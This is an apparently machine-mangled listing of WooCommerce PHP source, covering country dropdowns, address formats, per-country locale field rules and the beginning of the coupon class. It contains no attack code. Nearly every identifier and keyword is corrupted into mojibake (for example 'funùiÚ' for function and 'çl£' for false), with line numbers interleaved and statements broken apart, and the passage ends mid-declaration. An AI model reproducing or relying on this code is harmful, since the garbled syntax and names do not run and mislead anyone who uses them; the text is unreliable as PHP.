Ğ
$cc
 ) {

550  ( 
	`is£t
Ğ
$this
->
¡©es
[ 
$cc
 ] ) ) ? $this->¡©es[ $cø] : 
çl£
;

551 
	}
}

563 
public
 
funùiÚ
 
couÁry_drİdown_İtiÚs
Ğ
$£Ëùed_couÁry
 = '', 
$£Ëùed_¡©e
 = '', 
$esÿ³
 = 
çl£
 ) {

565 iàĞ
­¶y_f‹rs
('woocomm”û_sÜt_couÁr›s', 
Œue
 ) )

566 
asÜt
Ğ
$this
->
couÁr›s
 );

568 iàĞ
	g$this
->
	gcouÁr›s
 ) 
fÜ—ch
 ( 
$this
->
couÁr›s
 
as
 
$key
=>
$v®ue
) :

569 iàĞ
$¡©es
 = 
$this
->
g‘_¡©es
(
$key
) ) :

570 
echo
 '<İtgrou°Ïb–="' . 
esc_©Œ
Ğ
$v®ue
 ) . '">';

571 
fÜ—ch
 (
$¡©es
 
as
 
$¡©e_key
=>
$¡©e_v®ue
) :

572 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$key
 ) . ':'.
$¡©e_key
.'"';

574 ià(
	g$£Ëùed_couÁry
==
$key
 && 
$£Ëùed_¡©e
==
$¡©e_key
è
echo
 ' selected="selected"';

576 
	gecho
 '>'.
	g$v®ue
.' &mdash; '. (
	g$esÿ³
 ? 
esc_js
(
$¡©e_v®ue
) : $state_value) .'</option>';

577 
	g’dfÜ—ch
;

578 
	gecho
 '</optgroup>';

580 
echo
 '<option';

581 ià(
	g$£Ëùed_couÁry
==
$key
 && 
$£Ëùed_¡©e
=='*'è
echo
 ' selected="selected"';

582 
	gecho
 ' v®ue="' . 
esc_©Œ
Ğ
$key
 ) . '">'. (
	g$esÿ³
 ? 
esc_js
Ğ
$v®ue
 ) : $value) .'</option>';

583 
	g’dif
;

584 
	g’dfÜ—ch
;

594 
public
 
funùiÚ
 
	$g‘_add»ss_fÜm©s
() {

596 ià(!
$this
->
add»ss_fÜm©s
) :

599 
$po¡code_befÜe_c™y
 = "{company}\n{name}\n{address_1}\n{address_2}\n{postcode} {city}\n{country}";

602 
$this
->
add»ss_fÜm©s
 = 
	`­¶y_f‹rs
('woocomm”û_loÿli§tiÚ_add»ss_fÜm©s', 
	`¬¿y
(

605 'AT' => 
$po¡code_befÜe_c™y
,

606 'BE' => 
$po¡code_befÜe_c™y
,

608 'CH' => 
$po¡code_befÜe_c™y
,

610 'CZ' => 
$po¡code_befÜe_c™y
,

611 'DE' => 
$po¡code_befÜe_c™y
,

612 'EE' => 
$po¡code_befÜe_c™y
,

613 'FI' => 
$po¡code_befÜe_c™y
,

614 'DK' => 
$po¡code_befÜe_c™y
,

618 'IS' => 
$po¡code_befÜe_c™y
,

621 'LI' => 
$po¡code_befÜe_c™y
,

622 'NL' => 
$po¡code_befÜe_c™y
,

624 'NO' => 
$po¡code_befÜe_c™y
,

625 'PL' => 
$po¡code_befÜe_c™y
,

626 'SK' => 
$po¡code_befÜe_c™y
,

627 'SI' => 
$po¡code_befÜe_c™y
,

629 'SE' => 
$po¡code_befÜe_c™y
,

634 
’dif
;

636  
$this
->
add»ss_fÜm©s
;

637 
	}
}

647 
public
 
funùiÚ
 
g‘_fÜm©‹d_add»ss
Ğ
$¬gs
 = 
	$¬¿y
() ) {

649 
$¬gs
 = 
	`¬¿y_m­
( 'trim', $args );

651 
	`exŒaù
Ğ
$¬gs
 );

654 
$fÜm©s
 = 
$this
->
	`g‘_add»ss_fÜm©s
();

657 
$fÜm©
 = ( 
$couÁry
 && 
	`is£t
Ğ
$fÜm©s
[ $country ] ) ) ? $formats[ $country ] : $formats['default'];

660 
$fuÎ_couÁry
 = ( 
	`is£t
Ğ
$this
->
couÁr›s
[ 
$couÁry
 ] ) ) ? $this->countries[ $country ] : $country;

663 iàĞ
$couÁry
 =ğ
$this
->
	`g‘_ba£_couÁry
(è&& ! 
	`­¶y_f‹rs
Ğ'woocomm”û_fÜm©‹d_add»ss_fÜû_couÁry_di¥Ïy', 
çl£
 ) )

664 
$fÜm©
 = 
	`¡r_»¶aû
( '{country}', '', $format );

667 
$fuÎ_¡©e
 = ( 
$couÁry
 && 
$¡©e
 && 
	`is£t
Ğ
$this
->
¡©es
[ $country ][ $state ] ) ) ? $this->states[ $country ][ $state ] : $state;

670 
$»¶aû
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_fÜm©‹d_add»ss_»¶aûm’ts', 
	`¬¿y
(

671 '{fœ¡_Çme}' => 
$fœ¡_Çme
,

672 '{Ï¡_Çme}' => 
$Ï¡_Çme
,

673 '{Çme}' => 
$fœ¡_Çme
 . ' ' . 
$Ï¡_Çme
,

674 '{com·ny}' => 
$com·ny
,

675 '{add»ss_1}' => 
$add»ss_1
,

676 '{add»ss_2}' => 
$add»ss_2
,

677 '{c™y}' => 
$c™y
,

678 '{¡©e}' => 
$fuÎ_¡©e
,

679 '{po¡code}' => 
$po¡code
,

680 '{couÁry}' => 
$fuÎ_couÁry
,

681 '{fœ¡_Çme_uµ”}' => 
	`¡¹ouµ”
Ğ
$fœ¡_Çme
 ),

682 '{Ï¡_Çme_uµ”}' => 
	`¡¹ouµ”
Ğ
$Ï¡_Çme
 ),

683 '{Çme_uµ”}' => 
	`¡¹ouµ”
Ğ
$fœ¡_Çme
 . ' ' . 
$Ï¡_Çme
 ),

684 '{com·ny_uµ”}' => 
	`¡¹ouµ”
Ğ
$com·ny
 ),

685 '{add»ss_1_uµ”}' => 
	`¡¹ouµ”
Ğ
$add»ss_1
 ),

686 '{add»ss_2_uµ”}' => 
	`¡¹ouµ”
Ğ
$add»ss_2
 ),

687 '{c™y_uµ”}' => 
	`¡¹ouµ”
Ğ
$c™y
 ),

688 '{¡©e_uµ”}' => 
	`¡¹ouµ”
Ğ
$fuÎ_¡©e
 ),

689 '{po¡code_uµ”}' => 
	`¡¹ouµ”
Ğ
$po¡code
 ),

690 '{couÁry_uµ”}' => 
	`¡¹ouµ”
Ğ
$fuÎ_couÁry
 ),

691 ), 
$¬gs
 ) ;

693 
$»¶aû
 = 
	`¬¿y_m­
( 'esc_html', $replace );

695 
$fÜm©‹d_add»ss
 = 
	`¡r_»¶aû
Ğ
	`¬¿y_keys
Ğ
$»¶aû
 ), $»¶aû, 
$fÜm©
 );

698 
$fÜm©‹d_add»ss
 = 
	`´eg_»¶aû
Ğ'/ +/', ' ', 
	`Œim
( $formatted_address ) );

699 
$fÜm©‹d_add»ss
 = 
	`´eg_»¶aû
( '/\n\n+/', "\n", $formatted_address );

702 
$fÜm©‹d_add»ss
 = 
	`Æ2br
( $formatted_address );

705  
$fÜm©‹d_add»ss
;

706 
	}
}

715 
public
 
funùiÚ
 
	$g‘_deçuÉ_add»ss_f›lds
() {

716 
$f›lds
 = 
	`¬¿y
(

717 'couÁry' => 
	`¬¿y
(

719 'Ïb–' => 
	`__
( 'Country', 'woocommerce' ),

720 '»quœed' => 
Œue
,

721 'şass' => 
	`¬¿y
( 'form-row-wide', 'address-field', 'update_totals_on_change' ),

723 'fœ¡_Çme' => 
	`¬¿y
(

724 'Ïb–' => 
	`__
( 'First Name', 'woocommerce' ),

725 '»quœed' => 
Œue
,

726 'şass' => 
	`¬¿y
( 'form-row-first' ),

728 'Ï¡_Çme' => 
	`¬¿y
(

729 'Ïb–' => 
	`__
( 'Last Name', 'woocommerce' ),

730 '»quœed' => 
Œue
,

731 'şass' => 
	`¬¿y
( 'form-row-last' ),

732 'ş—r' => 
Œue


734 'com·ny' => 
	`¬¿y
(

735 'Ïb–' => 
	`__
( 'Company Name', 'woocommerce' ),

736 'şass' => 
	`¬¿y
( 'form-row-wide' ),

738 'add»ss_1' => 
	`¬¿y
(

739 'Ïb–' => 
	`__
( 'Address', 'woocommerce' ),

740 '¶aûhŞd”' => 
	`_x
( 'Street‡ddress', 'placeholder', 'woocommerce' ),

741 '»quœed' => 
Œue
,

742 'şass' => 
	`¬¿y
( 'form-row-wide', 'address-field' )

744 'add»ss_2' => 
	`¬¿y
(

745 '¶aûhŞd”' => 
	`_x
( 'Apartment, suite, unitƒtc. (optional)', 'placeholder', 'woocommerce' ),

746 'şass' => 
	`¬¿y
( 'form-row-wide', 'address-field' ),

747 '»quœed' => 
çl£


749 'c™y' => 
	`¬¿y
(

750 'Ïb–' => 
	`__
( 'Town / City', 'woocommerce' ),

751 '¶aûhŞd”' => 
	`__
( 'Town / City', 'woocommerce' ),

752 '»quœed' => 
Œue
,

753 'şass' => 
	`¬¿y
( 'form-row-wide', 'address-field' )

755 '¡©e' => 
	`¬¿y
(

757 'Ïb–' => 
	`__
( 'State / County', 'woocommerce' ),

758 '¶aûhŞd”' => 
	`__
( 'State / County', 'woocommerce' ),

759 '»quœed' => 
Œue
,

760 'şass' => 
	`¬¿y
( 'form-row-first', 'address-field' ),

761 'v®id©e' => 
	`¬¿y
( 'state' )

763 'po¡code' => 
	`¬¿y
(

764 'Ïb–' => 
	`__
( 'Postcode / Zip', 'woocommerce' ),

765 '¶aûhŞd”' => 
	`__
( 'Postcode / Zip', 'woocommerce' ),

766 '»quœed' => 
Œue
,

767 'şass' => 
	`¬¿y
( 'form-row-last', 'address-field' ),

768 'ş—r' => 
Œue
,

769 'v®id©e' => 
	`¬¿y
( 'postcode' )

773  
	`­¶y_f‹rs
Ğ'woocomm”û_deçuÉ_add»ss_f›lds', 
$f›lds
 );

774 
	}
}

782 
public
 
funùiÚ
 
	$g‘_couÁry_loÿË_f›ld_£ËùÜs
() {

783 
$loÿË_f›lds
 = 
	`¬¿y
 (

791  
	`­¶y_f‹rs
Ğ'woocomm”û_couÁry_loÿË_f›ld_£ËùÜs', 
$loÿË_f›lds
 );

792 
	}
}

800 
public
 
funùiÚ
 
	$g‘_couÁry_loÿË
() {

801 iàĞ! 
$this
->
loÿË
 ) {

804 
$this
->
loÿË
 = 
	`­¶y_f‹rs
('woocomm”û_g‘_couÁry_loÿË', 
	`¬¿y
(

805 'AE' => 
	`¬¿y
(

806 'po¡code' => 
	`¬¿y
(

807 '»quœed' => 
çl£
,

808 'hidd’' => 
Œue


811 'AF' => 
	`¬¿y
(

812 '¡©e' => 
	`¬¿y
(

813 '»quœed' => 
çl£
,

816 'AT' => 
	`¬¿y
(

817 'po¡code_befÜe_c™y' => 
Œue
,

818 '¡©e' => 
	`¬¿y
(

819 '»quœed' => 
çl£


822 'BD' => 
	`¬¿y
(

823 'po¡code' => 
	`¬¿y
(

824 '»quœed' => 
çl£


826 '¡©e' => 
	`¬¿y
(

827 'Ïb–' => 
	`__
( 'District', 'woocommerce' ),

830 'BE' => 
	`¬¿y
(

831 'po¡code_befÜe_c™y' => 
Œue
,

832 '¡©e' => 
	`¬¿y
(

833 '»quœed' => 
çl£
,

834 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

837 'BI' => 
	`¬¿y
(

838 '¡©e' => 
	`¬¿y
(

839 '»quœed' => 
çl£
,

842 'BO' => 
	`¬¿y
(

843 'po¡code' => 
	`¬¿y
(

844 '»quœed' => 
çl£
,

845 'hidd’' => 
Œue


848 'CA' => 
	`¬¿y
(

849 '¡©e' => 
	`¬¿y
(

850 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

853 'CH' => 
	`¬¿y
(

854 'po¡code_befÜe_c™y' => 
Œue
,

855 '¡©e' => 
	`¬¿y
(

856 'Ïb–' => 
	`__
( 'Canton', 'woocommerce' ),

857 '»quœed' => 
çl£


860 'CL' => 
	`¬¿y
(

861 'c™y' => 
	`¬¿y
(

862 '»quœed' => 
çl£
,

864 '¡©e' => 
	`¬¿y
(

865 'Ïb–' => 
	`__
( 'Municipality', 'woocommerce' ),

868 'CN' => 
	`¬¿y
(

869 '¡©e' => 
	`¬¿y
(

870 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

873 'CO' => 
	`¬¿y
(

874 'po¡code' => 
	`¬¿y
(

875 '»quœed' => 
çl£


878 'CZ' => 
	`¬¿y
(

879 '¡©e' => 
	`¬¿y
(

880 '»quœed' => 
çl£


883 'DE' => 
	`¬¿y
(

884 'po¡code_befÜe_c™y' => 
Œue
,

885 '¡©e' => 
	`¬¿y
(

886 '»quœed' => 
çl£


889 'DK' => 
	`¬¿y
(

890 'po¡code_befÜe_c™y' => 
Œue
,

891 '¡©e' => 
	`¬¿y
(

892 '»quœed' => 
çl£


895 'EE' => 
	`¬¿y
(

896 'po¡code_befÜe_c™y' => 
Œue
,

897 '¡©e' => 
	`¬¿y
(

898 '»quœed' => 
çl£


901 'FI' => 
	`¬¿y
(

902 'po¡code_befÜe_c™y' => 
Œue
,

903 '¡©e' => 
	`¬¿y
(

904 '»quœed' => 
çl£


907 'FR' => 
	`¬¿y
(

908 'po¡code_befÜe_c™y' => 
Œue
,

909 '¡©e' => 
	`¬¿y
(

910 '»quœed' => 
çl£


913 'HK' => 
	`¬¿y
(

914 'po¡code' => 
	`¬¿y
(

915 '»quœed' => 
çl£


917 'c™y' => 
	`¬¿y
(

918 'Ïb–' => 
	`__
( 'Town / District', 'woocommerce' ),

920 '¡©e' => 
	`¬¿y
(

921 'Ïb–' => 
	`__
( 'Region', 'woocommerce' ),

924 'HU' => 
	`¬¿y
(

925 '¡©e' => 
	`¬¿y
(

926 'Ïb–' => 
	`__
( 'County', 'woocommerce' ),

929 'ID' => 
	`¬¿y
(

930 '¡©e' => 
	`¬¿y
(

931 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

934 'IS' => 
	`¬¿y
(

935 'po¡code_befÜe_c™y' => 
Œue
,

936 '¡©e' => 
	`¬¿y
(

937 '»quœed' => 
çl£


940 'IL' => 
	`¬¿y
(

941 'po¡code_befÜe_c™y' => 
Œue
,

942 '¡©e' => 
	`¬¿y
(

943 '»quœed' => 
çl£


946 'IT' => 
	`¬¿y
(

947 'po¡code_befÜe_c™y' => 
Œue
,

948 '¡©e' => 
	`¬¿y
(

949 '»quœed' => 
Œue
,

950 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

953 'JP' => 
	`¬¿y
(

954 '¡©e' => 
	`¬¿y
(

955 'Ïb–' => 
	`__
( 'Province', 'woocommerce' )

958 'KR' => 
	`¬¿y
(

959 '¡©e' => 
	`¬¿y
(

960 '»quœed' => 
çl£


963 'NL' => 
	`¬¿y
(

964 'po¡code_befÜe_c™y' => 
Œue
,

965 '¡©e' => 
	`¬¿y
(

966 '»quœed' => 
çl£
,

967 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

970 'NZ' => 
	`¬¿y
(

971 '¡©e' => 
	`¬¿y
(

972 '»quœed' => 
çl£


975 'NO' => 
	`¬¿y
(

976 'po¡code_befÜe_c™y' => 
Œue
,

977 '¡©e' => 
	`¬¿y
(

978 '»quœed' => 
çl£


981 'PL' => 
	`¬¿y
(

982 'po¡code_befÜe_c™y' => 
Œue
,

983 '¡©e' => 
	`¬¿y
(

984 '»quœed' => 
çl£


987 'PT' => 
	`¬¿y
(

988 '¡©e' => 
	`¬¿y
(

989 '»quœed' => 
çl£


992 'RO' => 
	`¬¿y
(

993 '¡©e' => 
	`¬¿y
(

994 '»quœed' => 
çl£


997 'SG' => 
	`¬¿y
(

998 '¡©e' => 
	`¬¿y
(

999 '»quœed' => 
çl£


1002 'SK' => 
	`¬¿y
(

1003 'po¡code_befÜe_c™y' => 
Œue
,

1004 '¡©e' => 
	`¬¿y
(

1005 '»quœed' => 
çl£


1008 'SI' => 
	`¬¿y
(

1009 'po¡code_befÜe_c™y' => 
Œue
,

1010 '¡©e' => 
	`¬¿y
(

1011 '»quœed' => 
çl£


1014 'ES' => 
	`¬¿y
(

1015 'po¡code_befÜe_c™y' => 
Œue
,

1016 '¡©e' => 
	`¬¿y
(

1017 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

1020 'LI' => 
	`¬¿y
(

1021 'po¡code_befÜe_c™y' => 
Œue
,

1022 '¡©e' => 
	`¬¿y
(

1023 'Ïb–' => 
	`__
( 'Municipality', 'woocommerce' ),

1024 '»quœed' => 
çl£


1027 'LK' => 
	`¬¿y
(

1028 '¡©e' => 
	`¬¿y
(

1029 '»quœed' => 
çl£


1032 'SE' => 
	`¬¿y
(

1033 'po¡code_befÜe_c™y' => 
Œue
,

1034 '¡©e' => 
	`¬¿y
(

1035 '»quœed' => 
çl£


1038 'TR' => 
	`¬¿y
(

1039 'po¡code_befÜe_c™y' => 
Œue
,

1040 '¡©e' => 
	`¬¿y
(

1041 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

1044 'US' => 
	`¬¿y
(

1045 'po¡code' => 
	`¬¿y
(

1046 'Ïb–' => 
	`__
( 'Zip', 'woocommerce' ),

1048 '¡©e' => 
	`¬¿y
(

1049 'Ïb–' => 
	`__
( 'State', 'woocommerce' ),

1052 'GB' => 
	`¬¿y
(

1053 'po¡code' => 
	`¬¿y
(

1054 'Ïb–' => 
	`__
( 'Postcode', 'woocommerce' ),

1056 '¡©e' => 
	`¬¿y
(

1057 'Ïb–' => 
	`__
( 'County', 'woocommerce' ),

1058 '»quœed' => 
çl£


1061 'VN' => 
	`¬¿y
(

1062 '¡©e' => 
	`¬¿y
(

1063 '»quœed' => 
çl£


1065 'po¡code' => 
	`¬¿y
(

1066 '»quœed' => 
çl£
,

1067 'hidd’' => 
Œue


1069 'add»ss_2' => 
	`¬¿y
(

1070 '»quœed' => 
çl£
,

1071 'hidd’' => 
Œue


1074 'WS' => 
	`¬¿y
(

1075 'po¡code' => 
	`¬¿y
(

1076 '»quœed' => 
çl£
,

1077 'hidd’' => 
Œue


1080 'ZA' => 
	`¬¿y
(

1081 '¡©e' => 
	`¬¿y
(

1082 'Ïb–' => 
	`__
( 'Province', 'woocommerce' ),

1085 'ZW' => 
	`¬¿y
(

1086 'po¡code' => 
	`¬¿y
(

1087 '»quœed' => 
çl£
,

1088 'hidd’' => 
Œue


1093 
$this
->
loÿË
 = 
	`¬¿y_š‹r£ù_key
Ğ$this->loÿË, 
	`¬¿y_m”ge
Ğ$this->
	`g‘_®lowed_couÁr›s
(), $this->
	`g‘_shpšg_couÁr›s
() ) );

1097 
$this
->
loÿË
['deçuÉ'] = 
	`­¶y_f‹rs
('woocomm”û_g‘_couÁry_loÿË_deçuÉ', $this->
	`g‘_deçuÉ_add»ss_f›lds
() );

1100 iàĞ! 
	`is£t
Ğ
$this
->
loÿË
[ $this->
	`g‘_ba£_couÁry
() ] ) )

1101 
$this
->
loÿË
[ $this->
	`g‘_ba£_couÁry
() ] = $this->locale['default'];

1103 
$this
->
loÿË
['deçuÉ'] = 
	`­¶y_f‹rs
( 'woocommerce_get_country_locale_base', $this->locale['default'] );

1104 
$this
->
loÿË
[ $this->
	`g‘_ba£_couÁry
(è] = 
	`­¶y_f‹rs
( 'woocommerce_get_country_locale_base', $this->locale[ $this->get_base_country() ] );

1107  
$this
->
loÿË
;

1108 
	}
}

1118 
public
 
funùiÚ
 
g‘_add»ss_f›lds
Ğ
$couÁry
, 
$ty³
 = 'billing_' ) {

1120 ià(!
$couÁry
)

1121 
$couÁry
 = 
$this
->
g‘_ba£_couÁry
();

1123 
	g$f›lds
 = 
$this
->
g‘_deçuÉ_add»ss_f›lds
();

1124 
	g$loÿË
 = 
$this
->
g‘_couÁry_loÿË
();

1126 iàĞ
is£t
Ğ
$loÿË
[ 
$couÁry
 ] ) ) {

1128 
	g$f›lds
 = 
wc_¬¿y_ov”Ïy
Ğ
$f›lds
, 
$loÿË
[ 
$couÁry
 ] );

1132 iàĞ
is£t
Ğ
$loÿË
[ 
$couÁry
 ]['postcode_before_city'] ) ) {

1133 iàĞ
is£t
Ğ
$f›lds
['postcode'] ) ) {

1134 
	g$f›lds
['po¡code']['şass'] = 
¬¿y
( 'form-row-wide', 'address-field' );

1136 
	g$sw™ch_f›lds
 = 
¬¿y
();

1138 
fÜ—ch
 ( 
$f›lds
 
as
 
$key
 => 
$v®ue
 ) {

1139 iàĞ
$key
 == 'city' ) {

1141 
$sw™ch_f›lds
['postcode'] = '';

1143 
	g$sw™ch_f›lds
[
$key
] = 
$v®ue
;

1146 
	g$f›lds
 = 
$sw™ch_f›lds
;

1152 
	g$add»ss_f›lds
 = 
¬¿y
();

1154 
fÜ—ch
 ( 
$f›lds
 
as
 
$key
 => 
$v®ue
 ) {

1155 
$add»ss_f›lds
[
$ty³
 . 
$key
] = 
$v®ue
;

1159 iàĞ
	g$ty³
 == 'billing_' ) {

1161 
$add»ss_f›lds
['blšg_ema'] = 
¬¿y
(

1162 'Ïb–' => 
__
( 'Email Address', 'woocommerce' ),

1163 '»quœed' => 
Œue
,

1164 'şass' => 
¬¿y
( 'form-row-first' ),

1165 'v®id©e' => 
¬¿y
( 'email' ),

1167 
	g$add»ss_f›lds
['blšg_phÚe'] = 
¬¿y
(

1168 'Ïb–' => 
__
( 'Phone', 'woocommerce' ),

1169 '»quœed' => 
Œue
,

1170 'şass' => 
¬¿y
( 'form-row-last' ),

1171 'ş—r' => 
Œue
,

1172 'v®id©e' => 
¬¿y
( 'phone' ),

1177 
	g$add»ss_f›lds
 = 
­¶y_f‹rs
Ğ'woocomm”û_' . 
$ty³
 . 'f›lds', 
$add»ss_f›lds
, 
$couÁry
 );

1180  
	g$add»ss_f›lds
;

	@includes/class-wc-coupon.php

1 <?
php


12 şas 
	cWC_CoupÚ
 {

15 cÚ¡ 
	mE_WC_COUPON_INVALID_FILTERED
 = 100;

16 cÚ¡ 
	mE_WC_COUPON_INVALID_REMOVED
 = 101;

17 cÚ¡ 
	mE_WC_COUPON_NOT_YOURS_REMOVED
 = 102;

18 cÚ¡ 
	mE_WC_COUPON_ALREADY_APPLIED
 = 103;

19 cÚ¡ 
	mE_WC_COUPON_ALREADY_APPLIED_INDIV_USE_ONLY
 = 104;

20 cÚ¡ 
	mE_WC_COUPON_NOT_EXIST
 = 105;

21 cÚ¡ 
	mE_WC_COUPON_USAGE_LIMIT_REACHED
 = 106;

22 cÚ¡ 
	mE_WC_COUPON_EXPIRED
 = 107;

23 cÚ¡ 
	mE_WC_COUPON_MIN_SPEND_LIMIT_NOT_MET
 = 108;

24 cÚ¡ 
	mE_WC_COUPON_NOT_APPLICABLE
 = 109;

25 cÚ¡ 
	mE_WC_COUPON_NOT_VALID_SALE_ITEMS
 = 110;

26 cÚ¡ 
	mE_WC_COUPON_PLEASE_ENTER
 = 111;

27 cÚ¡ 
	mWC_COUPON_SUCCESS
 = 200;

28 cÚ¡ 
	mWC_COUPON_REMOVED
 = 201;

31 
public
 
	m$code
;

34 
public
 
	m$id
;

37 
public
 
	m$ty³
;

40 
public
 
	m$discouÁ_ty³
;

43 
public
 
	m$amouÁ
;

46 
public
 
	m$šdividu®_u£
;

49 
public
 
	m$´oduù_ids
;

52 
public
 
	m$u§ge_lim™
;

55 
public
 
	m$u§ge_lim™_³r_u£r
;

58 
public
 
	m$lim™_u§ge_to_x_™ems
;

61 
public
 
	m$u§ge_couÁ
;

64 
public
 
	m$expœy_d©e
;

67 
public
 
	m$­¶y_befÜe_x
;

70 
public
 
	m$ä“_shpšg
;

73 
public
 
	m$´oduù_ÿ‹gÜ›s
;

76 
public
 
	m$exşude_´oduù_ÿ‹gÜ›s
;

79 
public
 
	m$exşude_§Ë_™ems
;

82 
public
 
	m$mšimum_amouÁ
;

85 
public
 
	m$cu¡om”_ema
;

88 
public
 
	m$coupÚ_cu¡om_f›lds
;

91 
public
 
	m$coupÚ_amouÁ
;

94 
public
 
	m$”rÜ_mes§ge
;

102 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$code
 ) {

103 
glob®
 
$wpdb
;

105 
$this
->
code
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_code', 
$code
 );

108 
$coupÚ_d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_shİ_coupÚ_d©a', 
çl£
, 
$code
 );

110 iàĞ
$coupÚ_d©a
 ) {

112 
$this
->
id
 = 
	`absšt
Ğ
$coupÚ_d©a
['id'] );

113 
$this
->
ty³
 = 
	`esc_html
Ğ
$coupÚ_d©a
['type'] );

114 
$this
->
amouÁ
 = 
	`esc_html
Ğ
$coupÚ_d©a
['amount'] );

115 
$this
->
šdividu®_u£
 = 
	`esc_html
Ğ
$coupÚ_d©a
['individual_use'] );

116 
$this
->
´oduù_ids
 = 
	`is_¬¿y
Ğ
$coupÚ_d©a
['´oduù_ids'] ) ? $coupÚ_d©a['´oduù_ids'] : 
	`¬¿y
();

117 
$this
->
exşude_´oduù_ids
 = 
	`is_¬¿y
Ğ
$coupÚ_d©a
['exşude_´oduù_ids'] ) ? $coupÚ_d©a['exşude_´oduù_ids'] : 
	`¬¿y
();

118 
$this
->
u§ge_lim™
 = 
	`absšt
Ğ
$coupÚ_d©a
['usage_limit'] );

119 
$this
->
u§ge_lim™_³r_u£r
 = 
	`is£t
Ğ
$coupÚ_d©a
['u§ge_lim™_³r_u£r'] ) ? 
	`absšt
( $coupon_data['usage_limit_per_user'] ) : 0;

120 
$this
->
lim™_u§ge_to_x_™ems
 = 
	`is£t
Ğ
$coupÚ_d©a
['lim™_u§ge_to_x_™ems'] ) ? 
	`absšt
( $coupon_data['limit_usage_to_x_items'] ) : '';

121 
$this
->
u§ge_couÁ
 = 
	`absšt
Ğ
$coupÚ_d©a
['usage_count'] );

122 
$this
->
expœy_d©e
 = 
	`esc_html
Ğ
$coupÚ_d©a
['expiry_date'] );

123 
$this
->
­¶y_befÜe_x
 = 
	`esc_html
Ğ
$coupÚ_d©a
['apply_before_tax'] );

124 
$this
->
ä“_shpšg
 = 
	`esc_html
Ğ
$coupÚ_d©a
['free_shipping'] );

125 
$this
->
´oduù_ÿ‹gÜ›s
 = 
	`is_¬¿y
Ğ
$coupÚ_d©a
['´oduù_ÿ‹gÜ›s'] ) ? $coupÚ_d©a['´oduù_ÿ‹gÜ›s'] : 
	`¬¿y
();

126 
$this
->
exşude_´oduù_ÿ‹gÜ›s
 = 
	`is_¬¿y
Ğ
$coupÚ_d©a
['exşude_´oduù_ÿ‹gÜ›s'] ) ? $coupÚ_d©a['exşude_´oduù_ÿ‹gÜ›s'] : 
	`¬¿y
();

127 
$this
->
exşude_§Ë_™ems
 = 
	`esc_html
Ğ
$coupÚ_d©a
['exclude_sale_items'] );

128 
$this
->
mšimum_amouÁ
 = 
	`esc_html
Ğ
$coupÚ_d©a
['minimum_amount'] );

129 
$this
->
cu¡om”_ema
 = 
	`esc_html
Ğ
$coupÚ_d©a
['customer_email'] );

133 
$coupÚ_id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_code_qu”y', "SELECT ID FROM $wpdb->po¡ WHERE…o¡_t™Ë = % AND…o¡_ty³ = 'shİ_coupÚ' AND…o¡_¡©u ğ'publish'" ), 
$this
->
code
 ) );

135 iàĞ! 
$coupÚ_id
 )

138 
$coupÚ
 = 
	`g‘_po¡
Ğ
$coupÚ_id
 );

139 
$this
->
po¡_t™Ë
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_code', 
$coupÚ
->post_title );

141 iàĞ
	`em±y
Ğ
$coupÚ
 ) || 
$this
->
code
 !=ğ$coupÚ->
po¡_t™Ë
 )

144 
$this
->
id
 = 
$coupÚ
->
ID
;

145 
$this
->
coupÚ_cu¡om_f›lds
 = 
	`g‘_po¡_m‘a
Ğ$this->
id
 );

147 
$lßd_d©a
 = 
	`¬¿y
(

160 '´oduù_ÿ‹gÜ›s' => 
	`¬¿y
(),

161 'exşude_´oduù_ÿ‹gÜ›s' => 
	`¬¿y
(),

164 'cu¡om”_ema' => 
	`¬¿y
()

167 
	`fÜ—ch
 ( 
$lßd_d©a
 
as
 
$key
 => 
$deçuÉ
 )

168 
$this
->
$key
 = 
	`is£t
Ğ$this->
coupÚ_cu¡om_f›lds
[ $key ][0] ) && $this->coupÚ_cu¡om_f›lds[ $key ][0] !=ğ'' ? $this->coupÚ_cu¡om_f›lds[ $key ][0] : 
$deçuÉ
;

171 
$this
->
ty³
 = $this->
discouÁ_ty³
;

172 
$this
->
amouÁ
 = $this->
coupÚ_amouÁ
;

175 
$this
->
´oduù_ids
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
( ',', $this->product_ids ) ) );

176 
$this
->
exşude_´oduù_ids
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
( ',', $this->exclude_product_ids ) ) );

177 
$this
->
expœy_d©e
 = $this->expœy_d©? 
	`¡¹Ùime
( $this->expiry_date ) : '';

178 
$this
->
´oduù_ÿ‹gÜ›s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', (
¬¿y
è
	`maybe_un£rŸlize
( $this->product_categories ) ) );

179 
$this
->
exşude_´oduù_ÿ‹gÜ›s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', (
¬¿y
è
	`maybe_un£rŸlize
( $this->exclude_product_categories ) ) );

180 
$this
->
cu¡om”_ema
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim',‡¼ay_m­Ğ'¡¹Şow”', (
¬¿y
è
	`maybe_un£rŸlize
( $this->customer_email ) ) ) );

183 
	`do_aùiÚ
Ğ'woocomm”û_coupÚ_lßded', 
$this
 );

193 
public
 
funùiÚ
 
	$­¶y_befÜe_x
() {

194  
$this
->
­¶y_befÜe_x
 =ğ'yes' ? 
Œue
 : 
çl£
;

195 
	}
}

204 
public
 
funùiÚ
 
	$’abË_ä“_shpšg
() {

205  
$this
->
ä“_shpšg
 =ğ'yes' ? 
Œue
 : 
çl£
;

206 
	}
}

215 
public
 
funùiÚ
 
	$exşude_§Ë_™ems
